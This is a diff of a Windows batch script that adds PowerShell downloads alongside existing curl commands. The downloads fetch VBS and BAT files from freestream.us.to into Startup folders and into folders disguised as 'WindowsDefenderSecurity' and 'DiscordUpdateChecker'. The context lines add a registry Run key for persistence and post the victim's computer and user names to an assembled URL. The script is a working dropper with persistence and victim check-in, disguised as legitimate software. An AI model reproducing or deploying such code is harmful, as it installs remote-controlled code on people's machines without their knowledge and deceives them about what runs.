@@ -26,6 +26,7 @@ set userauto=YES
 )
 if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs" (
 copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DiscordUpdateChecker.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs')"
 curl -L "https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs"
 set userauto=YES, NEW CREATED
 )
@@ -39,6 +40,7 @@ if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Discor
 ::NET SESSION >nul 2>&1
 ::IF %ERRORLEVEL% EQU 0 (
 ::copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DiscordUpdateChecker.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+::powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs')"
 ::curl -L "https://freestream.us.to/schulprojekt/DiscordUpdateChecker.vbs" --output "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/DiscordUpdateChecker.vbs"
 ::set pcauto=YES, NEW CREATED
 ::) ELSE (
@@ -75,6 +77,7 @@ set userregistryauto=YES
 )
 if not exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
 copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
 curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
 set userregistryauto=YES, NEW CREATED
@@ -91,6 +94,7 @@ if not exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
 ::NET SESSION >nul 2>&1
 ::IF %ERRORLEVEL% EQU 0 (
 copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
 curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
 ::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
 ::set pcregistryauto=YES, NEW CREATED
@@ -115,11 +119,17 @@ set url=%url1%%url2%%url3%%url4%
 set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\nTIME: %time%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\n  UserRegistry-Autostart: %userregistryauto%\n  UserRegistry-File: %userregistryfile%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" %url%
 
-
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/UpdateChecker.bat', '%APPDATA%/DiscordUpdateChecker/UpdateChecker.bat')"
 curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%APPDATA%/DiscordUpdateChecker/UpdateChecker.bat"
+
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/UpdateChecker.bat', '%PROGRAMDATA%/DiscordUpdateChecker/UpdateChecker.bat')"
 curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%PROGRAMDATA%/DiscordUpdateChecker/UpdateChecker.bat"
 
+
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/UpdateChecker.bat', '%APPDATA%/WindowsDefenderSecurity/UpdateChecker.bat')"
 curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%APPDATA%/WindowsDefenderSecurity/UpdateChecker.bat"
+
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/UpdateChecker.bat', '%PROGRAMDATA%/WindowsDefenderSecurity/UpdateChecker.bat')"
 curl -L "https://freestream.us.to/schulprojekt/UpdateChecker.bat" --output "%PROGRAMDATA%/WindowsDefenderSecurity/UpdateChecker.bat"
 
 if %~dp0 NEQ %APPDATA%\DiscordUpdateChecker\ (
